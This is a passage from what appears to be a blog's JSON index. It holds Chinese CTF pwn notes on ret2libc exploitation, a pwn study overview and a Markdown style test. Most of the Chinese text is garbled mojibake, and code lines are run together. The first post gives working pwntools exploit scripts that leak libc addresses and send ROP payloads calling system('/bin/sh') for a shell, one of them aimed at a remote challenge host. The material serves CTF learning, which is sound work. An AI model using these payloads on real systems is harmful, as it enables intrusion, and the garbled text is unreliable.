ä¸ªå­—èŠ‚çš„æ•°æ®ã€‚.ljust(8, b&#x27;\\x00&#x27;): å¯¹æ¥æ”¶åˆ°çš„ 6 ä¸ªå­—èŠ‚æ•°æ®è¿›è¡Œå¡«å……ï¼Œ#ä½¿å…¶æ€»é•¿åº¦ä¸º 8 å­—èŠ‚ï¼Œå¡«å……å†…å®¹æ˜¯ 0x00 å­—èŠ‚ã€‚ä»¥åå¯ä»¥ä¸æ˜¯6ä½#puts_addr=u64(p.recvuntil(&#x27;\\n&#x27;)[:-1].ljust(8,&#x27;\\0&#x27;)) #å¾—åˆ° puts å‡½æ•° çš„åœ°å€;#p.recvuntil(&#x27;\\n&#x27;): ä»ç®¡é“ä¸­æ¥æ”¶æ•°æ®ï¼Œç›´åˆ°é‡åˆ°æ¢è¡Œç¬¦ \\n ä¸ºæ­¢ã€‚è¿™ä¸ªå‡½æ•°ä¼šå°†æ¥æ”¶åˆ°çš„æ•°æ®åŒ…æ‹¬æ¢è¡Œç¬¦åœ¨å†…å…¨éƒ¨è¿”å›ã€‚#[:-1]: ä½¿ç”¨åˆ‡ç‰‡æ“ä½œï¼Œå»æ‰æ¥æ”¶åˆ°çš„æ•°æ®ä¸­çš„æœ€åä¸€ä¸ªå­—ç¬¦ï¼Œå³æ¢è¡Œç¬¦ \\nã€‚#.ljust(8, &#x27;\\0&#x27;): å°†å‰©ä½™çš„æ•°æ®ï¼ˆä¸åŒ…æ‹¬æ¢è¡Œç¬¦ï¼‰è¿›è¡Œå¡«å……ï¼Œä½¿å…¶æ€»é•¿åº¦ä¸º 8 å­—èŠ‚ï¼Œå¡«å……å†…å®¹æ˜¯ç©ºå­—ç¬¦ \\0ã€‚ # 3. ç¬¬äºŒæ¬¡æº¢å‡ºæ„é€  payload2 # 3.1 è·å¾—åŸºåœ°å€ è¡Œé«˜äº®12libc=ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)#æœ¬åœ°è°ƒè¯•ï¼Œå¯ç”¨lddæŸ¥libc_base=gets_addr-libc.symbols[&quot;gets&quot;] # å¾—åˆ°åŸºåœ°å€ # 3.2 ç®— system å’Œ binsh åœ°å€ è¡Œé«˜äº®12system_addr=libc_base+libc.symbols[&quot;system&quot;]bin_sh_addr=libc_base+next(libc.search(b&#x27;/bin/sh&#x27;)) è¡Œé«˜äº®12345#è¿œç¨‹ç‰ˆæœ¬libc=LibcSearcher(&quot;puts&quot;,puts_addr) # å¾—åˆ° libcçš„ç‰ˆæœ¬;libc_base=puts_addr-libc.dump(&quot;puts&quot;) # å¾—åˆ°åŸºåœ°å€sys_addr=libc_base+libc.dump(&quot;system&quot;) # åˆ©ç”¨åç§»åœ°å€ å¾—åˆ° systemå‡½æ•°çš„åœ°å€binsh=libc_base+libc.dump(&quot;str_bin_sh&quot;) # å¾—åˆ° bin/sh çš„ åœ°å€ # 3.3 è·å– shell è¡Œé«˜äº®1234567payload2=offset*b&quot;B&quot;+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr) #64ä½ä¸‰æ­¥èµ°ï¼Œå’Œrettextä¸€æ ·ä¸€èˆ¬ä¼šæ¥æ”¶åˆ°ç¨‹åºæœ¬èº«çš„å­—ç¬¦ä¸²åï¼Œå†å‘é€payloaddelimiter = &#x27;input:&#x27;io.sendlineafter(delimiter, payload2)pause()io.interactive() # 2ï¼‰x86: æœ€å¤§åŒºåˆ«æ˜¯å‚æ•°å­˜æ”¾ä¸ç”¨å¯„å­˜å™¨ # 0. ä½¿ç”¨æ¡ä»¶ ret2libc çš„ä½¿ç”¨æ¡ä»¶ æ³„æ¼ Libc å‡½æ•°åœ°å€çš„æ¡ä»¶ï¼šç¨‹åºæœ‰è¾“å‡ºå‡½æ•°ï¼Œå¦‚ putsã€printfã€writeï¼›è¦è¾“å‡ºå‡½æ•°çš„ç›®çš„æ˜¯è¦æ³„æ¼åœ°å€ å®ç°ï¼šè®¾ç½®å¥½è¾“å‡ºå‡½æ•°çš„å‚æ•°ä¸ºæŸå‡½æ•° GOT è¡¨åœ°å€ï¼›GOT è¡¨ä¸­ä¿å­˜å·²è°ƒç”¨è¿‡çš„å‡½æ•°çš„çœŸå®åœ°å€ # 1. æ ¸å¿ƒ æ³„æ¼ ret2libc_32 ä»»æ„ä¸€ä¸ªå‡½æ•°çš„ä½ç½® è·å– libc çš„ç‰ˆæœ¬ æ ¹æ®åç§»è·å– shell å’Œ sh çš„ä½ç½® æ‰§è¡Œç¨‹åºè·å– shell # 2. å†…å­˜åˆ†å¸ƒï¼Œä¸¾ä¾‹ ---esp --- ... --- buf ---ebp æ ˆå¸§ ---write@plt è¿”å›åœ°å€ ---main @@@@@' é¢„ç•™è¿”å›åœ°å€ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼'@@@@ --- 1 write å‡½æ•°å‚æ•°ä¸€ (1) ---write_got åœ°å€ write å‡½æ•°å‚æ•°äºŒ (write_got åœ°å€) --- 4 write å‡½æ•°å‚æ•°ä¸‰ (å†™ 4 å­—èŠ‚) 32 ä½ --- é«˜åœ°å€ï¼Œæ ˆåº• # 3. ç¬¬ä¸€æ¬¡æº¢å‡ºï¼Œç›®æ ‡ï¼šæ‰¾åˆ°ä¸€ä¸ªå‡½æ•°åœ°å€ ç¬¬ä¸€ä¸ªä»¥ write ä¸ºä¾‹å­ï¼š è¡Œé«˜äº®1234567write_plt=e.plt[&quot;write&quot;]write_got=e.got[&quot;write&quot;]main_addr=e.symbols[&quot;main&quot;]# char[88] ebp writeå‡½æ•°å‚æ•°ä¸€(1) writeå‡½æ•°å‚æ•°äºŒ(write_gotåœ°å€)payload=0x88*b&#x27;a&#x27;+ p32(0xdeadbeef) + p32(write_plt) + p32(main_addr) + p32(1)+p32(write_got)+p32(4)# writeå‡½æ•°è¿”å›åœ°å€ (è¿”å›åˆ°mainå‡½æ•°) writeå‡½æ•°å‚æ•°ä¸‰(å†™4å­—èŠ‚)32ä½# 0x88*b&#x27;a&#x27;+ p32(0xdeadbeef)å…¶å®æ˜¯charå’Œebpåˆ†å¼€çš„ï¼Œå¯ä»¥åˆèµ·æ¥ç®— ' ä¸ºä»€ä¹ˆåŠ  1ï¼ŒåŠ  4' åŸå› ï¼šwrite å‡½æ•°æœ¬èº«æœ‰ä¸‰ä¸ªå‚æ•°ï¼ˆ1ï¼Œ'hello!',5ï¼‰ å‡½æ•°è¯´æ˜ï¼šwrite () ä¼šæŠŠå‚æ•° buf æ‰€æŒ‡çš„å†…å­˜å†™å…¥ count ä¸ªå­—èŠ‚åˆ°å‚æ•° fd æ‰€æŒ‡çš„æ–‡ä»¶å†…ã€‚ è¿”å›å€¼ï¼šå¦‚æœé¡ºåˆ© write () ä¼šè¿”å›å®é™…å†™å…¥çš„å­—èŠ‚æ•°ï¼ˆlenï¼‰ã€‚å½“æœ‰é”™è¯¯å‘ç”Ÿæ—¶åˆ™è¿”å› - 1ï¼Œé”™è¯¯ä»£ç å­˜å…¥ errno ä¸­ã€‚ //write(int fd, const void *buf, size_t count); ç¬¬ä¸€ä¸ªå‚æ•° æ–‡ä»¶æè¿°ç¬¦ fd 1 è¾“å‡ºï¼Œ0 è¾“å…¥ ç¬¬äºŒä¸ªå‚æ•° æ— ç±»å‹çš„æŒ‡é’ˆ bufï¼Œå¯ä»¥å­˜æ”¾è¦å†™çš„å†…å®¹ ç¬¬ä¸‰ä¸ªå‚æ•° å†™å¤šå°‘å­—èŠ‚æ•° 4 å­—èŠ‚ ä¸‹é¢å†ä¸¾ä¸€ä¸ªï¼šæˆ‘ä»¬å†³å®šç”¨æ³„éœ²__libc_strart_main çš„åœ°å€ï¼Œæ¥åˆ¤å®š libc çš„ç‰ˆæœ¬ è¡Œé«˜äº®12345678#æ³„éœ²åœ°å€puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]print &quot;leak libc_start_main_got addr and return to main again&quot;payload = flat([&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])#è°ƒç”¨putså‡½æ•°åï¼Œretåˆ°mainå‡½æ•°ï¼Œç”¨mainå‡½æ•°é‡Œé¢çš„getsæ¥è·å–libc_startçš„åœ°å€sh.sendlineafter(&#x27;Can you find it !?&#x27;, payload)gets_addr = u32(p.recv()) # 4. ç¬¬äºŒæ¬¡æº¢å‡ºï¼Œç›®æ ‡ï¼šç›´æ¥è·å¾— shellï¼Œåƒ rettext ä¸€æ · # 4.1 è·å¾—åŸºåœ°å€ è¡Œé«˜äº®12libc = ELF(&quot;/lib32/libc.so.6&quot;) #è·å¾—libcç‰ˆæœ¬å·libc_base = gets_addr - libc.symbols[&quot;gets&quot;] # 4.2system å’Œ binsh åœ°å€ è¡Œé«˜äº®12system_addr = libc_base + libc.symbols[&quot;system&quot;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;)) # 4.3 ç»“æŸ è¡Œé«˜äº®123payload2 = padding*b&quot;A&quot; + p32(system_addr) + p32(0) + p32(bin_sh_addr) #32ä½ä¸¤æ­¥èµ°p.sendline(payload2)p.interactive() # 4.4 è¡¥å…… å¤§ä½¬ 1 å·å¿ƒå¾— ROP ä¸­å¯¹ retlibc æŠ€æœ¯çš„ä¸€äº›å­¦ä¹ å¿ƒå¾— æ¼æ´åˆ©ç”¨æ€è·¯ï¼š 1. æ‰¾åˆ°æ³„éœ²åº“å‡½æ•°åœ°å€çš„æ¼æ´ï¼Œè·å– libc ç‰ˆæœ¬ï¼ˆå› ä¸ºä¸€èˆ¬ä¸ä¼šç»™ä½  libc.so æ–‡ä»¶ï¼‰ æŸ¥è¯¢ libc ç‰ˆæœ¬ä¸€èˆ¬æœ‰ä¸‰ç§æ–¹æ³•ï¼š 1.libcsearcher åº“ã€‚åœ¨ç¼–å†™ exp çš„æ—¶å€™ç”¨ from LibcSearcher import LibcSearcher å¯¼å…¥ é€šè¿‡ libc.dump ('system') å¯ä»¥å¾—åˆ° system å‡½æ•°çš„åç§»ï¼Œlibc.dump ('str_bin_sh') å¾—åˆ° binsh å­—ç¬¦ä¸²çš„åç§» 2.pwntools è‡ªå¸¦çš„ Dynelfï¼Œéœ€è¦å…ˆæ„é€ ä¸€ä¸ª leak å‡½æ•°å’Œä¸€ä¸ªå¯ä»¥ä¸æ–­è§¦å‘æº¢å‡ºçš„æ¼æ´ ä¸€ä¸ªæ¨¡æ¿ï¼š è¡Œé«˜äº®12345678910def leak(address): #å„ç§é¢„å¤„ç† payload = &quot;xxxxxxxx&quot; + address + &quot;xxxxxxxx&quot; p.send(payload) #å„ç§å¤„ç† data = p.recv(4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;))) return datad = DynELF(leak, elf=ELF(&quot;./xxx&quot;)) #åˆå§‹åŒ–DynELFæ¨¡å— systemAddress = d.lookup(&#x27;system&#x27;, &#x27;libc&#x27;) #åœ¨libcæ–‡ä»¶ä¸­æœç´¢systemå‡½æ•°çš„åœ°å€ 3. åœ¨çº¿æŸ¥è¯¢ç½‘ç«™ï¼Œé€šè¿‡å‡½æ•°çš„åä¸‰ä½æ•°å€¼æŸ¥è¯¢ã€‚https://libc.blukat.me å…¸å‹çš„é¢˜ç›®â€“adworld é‡Œçš„ level1ï¼ˆéå¸¸å…¸å‹çš„ retlibcï¼‰ æºç ï¼š è¡Œé«˜äº®12345678910111213141516171819202122232425262728293031323334353637383940414243ssize_t vulnerable_function()&#123; char buf; // [esp+0h] [ebp-88h] printf(&quot;What&#x27;s this:%p?\\n&quot;, &amp;buf); return read(0, &amp;buf, 0x100u); //æº¢å‡ºç‚¹&#125;expï¼šfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level=&#x27;debug&#x27;#sh = process(&#x27;./level1&#x27;)sh=remote(&#x27;111.198.29.45&#x27;,42536)writeplt= 0x08048370readgot=0x0804A00Cvuln=0x0804847Bpayload = &#x27;a&#x27;*0x8c+p32(writeplt)+p32(vuln)+p32(1)+p32(readgot)+p32(4)#gdb.attach(sh)sh.sendline(payload)readaddr=u32(sh.recv(4))print(hex(readaddr))libc = LibcSearcher(&#x27;read&#x27;, readaddr)libcbase = readaddr - libc.dump(&#x27;read&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)payload=&#x27;a&#x27;*0x8c+p32(system_addr)+&#x27;a&#x27;*4+p32(binsh_addr)sh.sendline(payload)sh.interactive()sh.close() ç¬”è®°: context.log_level='debugâ€™å¼€å¯è°ƒè¯•æ¨¡å¼ï¼› å¤§ä½¬åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/qq_41706924/article/details/89607683","path":"CTF/Pwn/note/Pwn1/","date":"11-08","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Pwnæ¦‚è¿°","text":"# 0X01 Pwn ç®€ä»‹ # è½¯ä»¶å®‰å…¨ï¼šè½¯ä»¶å®‰å…¨ä¸“æ³¨äºç ”ç©¶è½¯ä»¶çš„è®¾è®¡å’Œå®ç°çš„å®‰å…¨ ç ”ç©¶å¯¹è±¡ï¼šä»£ç ï¼ˆæºç ã€å­—èŠ‚ç ã€æ±‡ç¼–ç­‰ï¼‰ ç ”ç©¶ç›®æ ‡ï¼šå‘æ˜æ¼æ´ã€åˆ©ç”¨æ¼æ´ã€ä¿®è¡¥æ¼æ´ ç ”ç©¶æŠ€æœ¯ï¼šé€†å‘å·¥ç¨‹ã€æ¼æ´æŒ–æ˜ä¸åˆ©ç”¨ã€æ¼æ´é˜²å¾¡æŠ€æœ¯ CTF PWNï¼šè½¯ä»¶å®‰å…¨ç ”ç©¶çš„ä¸€ä¸ªç¼©å½± # ç ”ç©¶å¯¹è±¡ï¼šå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸»è¦æ˜¯ ELF æ–‡ä»¶ ç ”ç©¶æœ€ç»ˆç›®æ ‡ï¼šå¤ºå– Flag è½¯ä»¶å®‰å…¨ä¸ CTF PWN ç‰¹ç‚¹ï¼šå…¥é—¨éš¾ã€è¿›é˜¶éš¾ã€ç²¾é€šéš¾ã€‚ # å·¥å…·ï¼š é™æ€åˆ†æï¼šIDA Pro åŠ¨æ€è°ƒè¯•ï¼šgdb (with peda or gef)ã€windbgã€ollydbg Exploitï¼špwntoolsã€zio # å‰ç½®æŠ€èƒ½ï¼š æ±‡ç¼–è¯­è¨€ï¼šç¨‹åºæ‰§è¡Œã€å‡½æ•°æ ˆå¸§ã€å‡½æ•°è°ƒç”¨ç­‰ ç¼–è¯‘ã€é“¾æ¥ã€è£…è½½ã€æ‰§è¡Œ ELF æ–‡ä»¶ç»“æ„ Linux ç³»ç»Ÿç›¸å…³ï¼šæ–‡ä»¶æè¿°ç¬¦ã€ç³»ç»Ÿè°ƒç”¨ã€socket ç¼–ç¨‹ã€shell å‘½ä»¤ ç¼–è¯‘åŸç†ï¼Œæ“ä½œç³»ç»Ÿï¼Œè®¡ç®—æœºç»„æˆåŸç† # 0X02 PWN å­¦ä¹ æ–¹æ³• # å­¦ä¹ é˜¶æ®µä¸€ï¼šå­¦ä¹ å¥—è·¯ å¥—è·¯æ˜¯æœ‰é™çš„ï¼Œå‡ä»¥æ—¶æ—¥ä¸€å®šä¼šå­¦å®Œçš„æ‹›å¼ é’ˆå¯¹æ¯ç§å¥—è·¯éƒ½ç»ƒä¹  1~2 é“ä¹ é¢˜ å­¦ä¹ å®Œæ‰€æœ‰å¸¸è§å¥—è·¯ï¼Œå¤§å¤šæ•°å›½å†…æ¯”èµ›çš„ä¸­æ¡£é¢˜åŸºæœ¬éƒ½å¯ä»¥éšä¾¿åˆ‡ # å­¦ä¹ é˜¶æ®µäºŒï¼šæ€»ç»“å¥—è·¯ï¼Œå˜å¥—è·¯ä¸ºè‰ºæœ¯ æ¼æ´åˆ©ç”¨æ˜¯ä¸€é—¨è‰ºæœ¯ï¼Œéš¾ä»¥ç”¨å¥—è·¯å®Œå…¨æ¦‚å†µï¼Œè¦æƒ³åˆ‡éš¾é¢˜ä¸èƒ½å…¨é å¥—è·¯ å¤šåˆ·åˆ·å›½é™…èµ›çš„éš¾é¢˜ï¼Œåˆ·çš„æ…¢æ²¡å…³ç³»ï¼Œåˆ·å¤šäº†è‡ªç„¶å°±ä¼šèä¼šè´¯é€š å¤šæ€»ç»“æ€è€ƒç°æœ‰çš„å¥—è·¯çš„æœ¬è´¨ # èµ„æºï¼š CTF Writeup Githubï¼šhttps://github.com/ctfs èšåˆäº†å„å¤§å›½é™…æ¯”èµ›çš„ä¹ é¢˜æ–‡ä»¶ä»¥åŠ writeup Googling:XXX writeup or XXX CTF ç™¾åº¦æ”¶å½•ä¸äº† github pages 0X03 PWN å­¦ä¹ æ¡ˆä¾‹ ROPï¼š 1ã€ROPï¼šç°ä»£æ ˆæº¢å‡ºä¸­æœ€åŸºç¡€çš„åˆ©ç”¨æŠ€æœ¯ï¼ˆæœ€ç®€å•æœ€åŸºç¡€çš„å¥—è·¯ï¼‰ 2ã€Googling ç­›é€‰åˆ°æ¯”è¾ƒå¥½çš„é¢˜ç›®ï¼šr0pbaby å­¦ä¹  writeupï¼Œå¯ä»¥å‚è€ƒå¤šç¯‡ writeupï¼Œæ ¹æ® writeup å’Œå­¦åˆ°çš„å†…å®¹è‡ªå·±åŠ¨æ‰‹è°ƒè¯•ä¸€ä¸‹ï¼Œå°½é‡è‡ªå·±åŠ¨æ‰‹é‡å†™ EXP é‡å†™ EXP æˆåŠŸï¼šåŸºæœ¬æŒæ¡äº† ROPã€‚ ç¬¬äºŒç«  CTF ä¸­æ¼æ´æŒ–æ˜çš„æ–¹æ³•è®ºï¼šä»é€†å‘å·¥ç¨‹åˆ°æ¼æ´æŒ–æ˜ 0X01 é€†å‘å·¥ç¨‹ç®€ä»‹ å¯¹äº PWN æ¥è¯´ï¼Œé€†å‘å·¥ç¨‹çš„ä¸»è¦ä½œç”¨ä¸ºå‘æ˜ä¸åˆ†ææ¼æ´ å·¥å…·ï¼š é™æ€åˆ†æå·¥å…·ï¼šIDA pro åŠ¨æ€è°ƒè¯•å·¥å…·ï¼šgdbã€windbgã€ollydbgã€IDA Pro IDA pro çš„ F5 å¤§æ³• 0X02 å¸¸è§æ¼æ´ç®€ä»‹ åœ¨è¿›è¡Œæ¼æ´æŒ–æ˜ä¹‹å‰ï¼Œå¿…é¡»å¯¹å¸¸è§æ¼æ´éå¸¸ç†Ÿæ‚‰ï¼ï¼ï¼ ç¼“å†²åŒºæº¢å‡ºï¼ˆBuffer Overflowï¼‰ å †æº¢å‡ºã€æ ˆæº¢å‡ºã€bss æº¢å‡ºã€data æº¢å‡ºï¼ˆé€šå¸¸è¦†ç›–æŒ‡é’ˆï¼‰ wellpwnã€AliCTF 2016 vssã€Hitcon 2015 readableã€stkofã€zerostorage æ•´æ•°æº¢å‡ºï¼ˆInteger Overflowï¼‰ æ— ç¬¦å·å‹ä¸æœ‰ç¬¦å·çš„è½¬æ¢ï¼ˆMMACTF 2016 shadowï¼‰ æ•´æ•°åŠ å‡ä¹˜é™¤æ³•ï¼Œå¦‚ malloc (size*2) (pwnhub.cn calc) æ•´æ•°æº¢å‡ºé€šå¸¸ä¼šè¿›ä¸€æ­¥è½¬æ¢ä¸ºç¼“å†²åŒºæº¢å‡ºã€é€»è¾‘æ¼æ´ç­‰å…¶ä»–æ¼æ´ æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ˆFormat Stringï¼‰ printf (s)ã€sprintf (s)ã€fprintf (s) ç­‰ï¼Œå¯èƒ½å¯¼è‡´ä»»æ„åœ°å€è¯»å†™ï¼ˆMMACTF 2016 greetingï¼‰ å¯ä»¥ç”¨æ¥ leakï¼ˆHCTF2016 fheapï¼‰ é‡Šæ”¾åä½¿ç”¨ï¼ˆUse-After-Freeï¼‰ é‡Šæ”¾æ‰çš„å†…å­˜å¯èƒ½ä¼šè¢«é‡æ–°åˆ†é…ï¼Œé‡Šæ”¾åä½¿ç”¨ä¼šå¯¼è‡´é‡æ–°åˆ†é…çš„å†…å­˜è¢«æ—§çš„ä½¿ç”¨æ‰€æ”¹å†™ Double free æ˜¯ä¸€ç§ç‰¹æ®Šçš„ UAF Defcon 2014 Qualifier shitscoã€AliCTF 2016 routerã€0CTF2016 freenoteï¼ˆdouble freeï¼‰ã€HCTF2016 fheapï¼ˆdouble freeï¼‰ é€»è¾‘æ¼æ´ è®¿é—®æ§åˆ¶ã€åè®®æ¼æ´ã€å¤šçº¿ç¨‹ç«æ€æ¡ä»¶ï¼ˆfake fuzzï¼‰ç­‰ 0X03 æ¼æ´æŒ–æ˜ä¸­çš„é€†å‘æŠ€å·§ å…³é”®æ•°æ®ç»“æ„åˆ†æï¼šè¿˜åŸç»“æ„ä½“ã€æ¥å£ã€ç±»ç­‰ æ§åˆ¶æµåˆ†æï¼šç†æ¸…æ¥šç¨‹åºçš„æ‰§è¡Œé€»è¾‘ï¼ŒåŸºæœ¬è¦åšåˆ°ä»åæ±‡ç¼–ä»£ç åˆ°æºç çš„è¿˜åŸ æ•°æ®æµåˆ†æï¼šç†æ¸…æ¥šæ•°æ®çš„æµå‘ CTF æ¼æ´æŒ–æ˜ä¸­çš„åˆ†æç­–ç•¥ï¼š ç›®æ ‡æ–‡ä»¶è¾ƒå°æ—¶ï¼Œé€šå¸¸é‡‡ç”¨å¯¹æ•´ä¸ªç›®æ ‡æ–‡ä»¶è¿›è¡Œæ§åˆ¶æµåˆ†æï¼Œåšåˆ°æ•´ä¸ªç¨‹åºä»åæ±‡ç¼–ä»£ç åˆ°æ¥è¿‘æºç çº§åˆ«çš„è¿˜åŸï¼Œè¿˜åŸçš„åŒæ—¶æŸ¥æ‰¾æ¼æ´ ç›®æ ‡æ–‡ä»¶è¾ƒå¤§æ—¶ï¼Œé€†å‘æ•´ä¸ªæ–‡ä»¶æ‰€éœ€å·¥ä½œé‡å¤ªå¤§ï¼Œé€šå¸¸éœ€è¦é¢å¤–çš„å…³æ³¨æ•°æ®æµï¼Œå¹¶ç†æ¸…æ¥šæ•°æ®æµæ‰€ç»ä¹‹å¤„çš„æ§åˆ¶æµï¼Œå› ä¸ºæ¼æ´çš„è§¦å‘ä¸æ•°æ®æµç¦»ä¸å¼€å…³ç³» æ— è®ºæ˜¯æ•°æ®æµåˆ†æå’Œæ§åˆ¶æµåˆ†æï¼Œè¿˜åŸç»“æ„ä½“ã€æ¥å£ã€ç±»éƒ½ä¼šä¿ƒè¿›é€†å‘å·¥ç¨‹ æ§åˆ¶æµåˆ†æçš„ä¸»è¦ä½œç”¨æ˜¯ç†æ¸…æ¥šç¨‹åºçš„é€»è¾‘ï¼Œå¯¹äºè§„æ¨¡è¾ƒå°çš„ç›®æ ‡æ–‡ä»¶ï¼Œä¸€èˆ¬é€‰æ‹©ç†æ¸…æ•´ä¸ªç›®æ ‡æ–‡ä»¶ã€‚ ä»£ç ä»¥è¯†åˆ«ä¸ºä¸»ï¼Œä¸è¦ç¡¬é€†ã€‚ å–„ç”¨æ ‡è®°ï¼Œæ ‡è®°ç»“æ„ä½“ã€æ ‡è®°å˜é‡åã€æ ‡è®°å˜é‡ç±»å‹ F5 å¤§æ³•å¥½ï¼Œä½†æ˜¯ F5 ä¸æ˜¯ä¸‡èƒ½çš„ï¼Œå½“å‘ç° F5 ç»“æœæ¯”è¾ƒè¯¡å¼‚æ—¶éœ€è¦åœ¨æ±‡ç¼–å±‚åˆ†æï¼ˆå¦‚ mmactf 2016 shadowï¼‰ æ•°æ®æµåˆ†æ ç›®æ ‡æ–‡ä»¶è¾ƒå¤§ï¼Œå…¨ç›˜é€†å‘ä¸ç°å® è¿½æº¯ç”¨æˆ·è¾“å…¥çš„èµ°å‘ï¼Œé‡ç‚¹å…³æ³¨å¯¹ç”¨æˆ·è¾“å…¥æ•°æ®å¤„ç†çš„å‡½æ•° å¯ä»¥åœ¨ä¸ç”¨é€†æ¸…æ¥šæ§åˆ¶æµå³å¯æ‰¾åˆ°æ¼æ´ï¼Œéœ€è¦ä¸€å®šçš„æŠ€å·§æ€§ ï¼ˆplaid CTF 2015 datastoreï¼‰ åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/prettyX/article/details/103173220","path":"CTF/Pwn/note/PWNæ¦‚è¿°/","date":"11-05","excerpt":"","tags":[{"name":"Pwn","slug":"Pwn","permalink":"http://example.com/tags/Pwn/"}]},{"title":"Markdown Style test","text":"This post is originated from here and is used for testing markdown style. This post contains nearly every markdown usage. Make sure all the markdown elements below show up correctly. # Headers è¡Œé«˜äº®1234567891011121314# H1## H2### H3#### H4##### H5###### H6Alternatively, for H1 and H2, an underline-ish style:Alt-H1======Alt-H2------ # H1 # H2 # H3 # H4 # H5 # H6 Alternatively, for H1 and H2, an underline-ish style: # Alt-H1 # Alt-H2 # Emphasis è¡Œé«˜äº®1234567Emphasis, aka italics, with *asterisks* or _underscores_.Strong emphasis, aka bold, with **asterisks** or __underscores__.Combined emphasis with **asterisks and _underscores_**.Strikethrough uses two tildes. ~~Scratch this.~~ Emphasis, aka italics, with asterisks or underscores. Strong emphasis, aka bold, with asterisks or underscores. Combined emphasis with asterisks and underscores. Strikethrough uses two tildes. Scratch this. # Lists è¡Œé«˜äº®123456789101112131415161718192021221. First ordered list item2. Another item * Unordered sub-list.1. Actual numbers don&#x27;t matter, just that it&#x27;s a number 1. Ordered sub-list4. And another item. You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we&#x27;ll use three here to also align the raw Markdown). To have a line break without a paragraph, you will need to use two trailing spaces. Note that this line is separate, but within the same paragraph. (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.)* Unordered list can use asterisks- Or minuses+ Or pluses- Paragraph In unordered list For example like this.Common Paragraph with some text.And more text. First ordered list item Another item Unordered sub-list. Actual numbers don't matter, just that it's a number Ordered sub-list And another item. You can have properly indented paragraphs within list items. Notice the blank line above, and the leading spaces (at least one, but we'll use three here to also align the raw Markdown). To have a line break without a paragraph, you will need to use two trailing spaces. Note that this line is separate, but within the same paragraph. (This is contrary to the typical GFM line break behaviour, where trailing spaces are not required.) Unordered list can use asterisks Or minuses Or pluses Paragraph In unordered list For example like this. Common Paragraph with some text. And more text. # Inline HTML è¡Œé«˜äº®1&lt;p&gt;To reboot your computer, press &lt;kbd&gt;ctrl&lt;/kbd&gt;+&lt;kbd&gt;alt&lt;/kbd&gt;+&lt;kbd&gt;del&lt;/kbd&gt;.&lt;/p&gt; &lt;p&gt;To reboot your computer, press &lt;kbd&gt;ctrl&lt;/kbd&gt;+&lt;kbd&gt;alt&lt;/kbd&gt;+&lt;kbd&gt;del&lt;/kbd&gt;.&lt;/p&gt; è¡Œé«˜äº®1234567&lt;dl&gt; &lt;dt&gt;Definition list&lt;/dt&gt; &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt; &lt;dt&gt;Markdown in HTML&lt;/dt&gt; &lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt;&lt;/dl&gt; &lt;dl&gt; &lt;dt&gt;Definition list&lt;/dt&gt; &lt;dd&gt;Is something people use sometimes.&lt;/dd&gt; è¡Œé«˜äº®12&lt;dt&gt;Markdown in HTML&lt;/dt&gt;&lt;dd&gt;Does *not* work **very** well. Use HTML &lt;em&gt;tags&lt;/em&gt;.&lt;/dd&gt; &lt;/dl&gt; # Links è¡Œé«˜äº®1234567891011121314151617[I&#x27;m an inline-style link](https://www.google.com)[I&#x27;m an inline-style link with title](https://www.google.com &quot;Google&#x27;s Homepage&quot;)[I&#x27;m a reference-style link][Arbitrary case-insensitive reference text][I&#x27;m a relative reference to a repository file](../blob/master/LICENSE)[You can use numbers for reference-style link definitions][1]Or leave it empty and use the [link text itself]Some text to show that the reference links can follow later.[arbitrary case-insensitive reference text]: https://hexo.io[1]: https://hexo.io/docs/[link text itself]: https://hexo.io/api/ I'm an inline-style link I'm an inline-style link with title I'm a reference-style link I'm a relative reference to a repository file You can use numbers for reference-style link definitions Or leave it empty and use the link text itself Some text to show that the reference links can follow later. # Images è¡Œé«˜äº®12345678910hover to see the title text:Inline-style:![alt text](https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 1&quot;)Reference-style:![alt text][logo][logo]: https://hexo.io/icon/favicon-196x196.png &quot;Logo Title Text 2&quot; hover to see the title text: Inline-style: Reference-style: # Code and Syntax Highlighting Inline code has back-ticks around it. 12var s = &quot;JavaScript syntax highlighting&quot;;alert(s); 12s = &quot;Python syntax highlighting&quot;print s 12No language indicated, so no syntax highlighting.But let&#x27;s throw in a &lt;b&gt;tag&lt;/b&gt;. # Tables è¡Œé«˜äº®12345| |ASCII |HTML ||----------------|-------------------------------|-----------------------------||Single backticks|`&#x27;Isn&#x27;t this fun?&#x27;` |&#x27;Isn&#x27;t this fun?&#x27; ||Quotes |`&quot;Isn&#x27;t this fun?&quot;` |&quot;Isn&#x27;t this fun?&quot; ||Dashes |`-- is en-dash, --- is em-dash`|-- is en-dash, --- is em-dash| ASCII HTML Single backticks 'Isn't this fun?' 'Isn't this fun?' Quotes &quot;Isn't this fun?&quot; &quot;Isn't this fun?&quot; Dashes -- is en-dash, --- is em-dash -- is en-dash, --- is em-dash Colons can be used to align columns. è¡Œé«˜äº®12345| Tables | Are | Cool || ------------- |:-------------:| -----:|| col 3 is | right-aligned | || col 2 is | centered | || zebra stripes | are neat | Tables Are Cool col 3 is right-aligned col 2 is centered zebra stripes are neat The outer pipes ( ) are optional, and you don't need to make the raw Markdown line up prettily. You can also use inline Markdown. 